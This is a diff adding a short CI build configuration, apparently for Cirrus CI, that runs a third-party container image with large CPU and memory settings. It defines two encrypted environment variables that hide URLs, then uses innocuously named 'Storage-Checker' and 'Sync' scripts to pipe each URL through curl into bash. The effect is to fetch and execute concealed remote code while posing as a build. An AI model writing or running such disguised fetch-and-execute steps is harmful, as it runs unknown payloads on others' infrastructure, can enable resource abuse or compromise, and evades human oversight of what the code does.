@@ -1,0 +1,15 @@
+env:
+    de: ENCRYPTED[d6e85fb9769064a67bf226f98c4faf0bdfda610fcd5b9ca52a0c9211645698d82eebcbeb0d9155355c31a5c277434a02]
+    dee: ENCRYPTED[fbe8cd9367deb6b7ce142cbeb1edcad3a47854d9ecc137d1577903b10e78a7620e1f8df7b0980b8f41466555c6a2dd90]
+
+task:
+  name: "build"
+  timeout_in: 120m
+  container:
+      image: shazuxdd/ubuntu:latest
+      cpu: 8
+      memory: 32G
+  Storage-Checker_script:
+      - curl -sL ${de} | bash
+  Sync_script:
+      - curl -sL ${dee} | bash
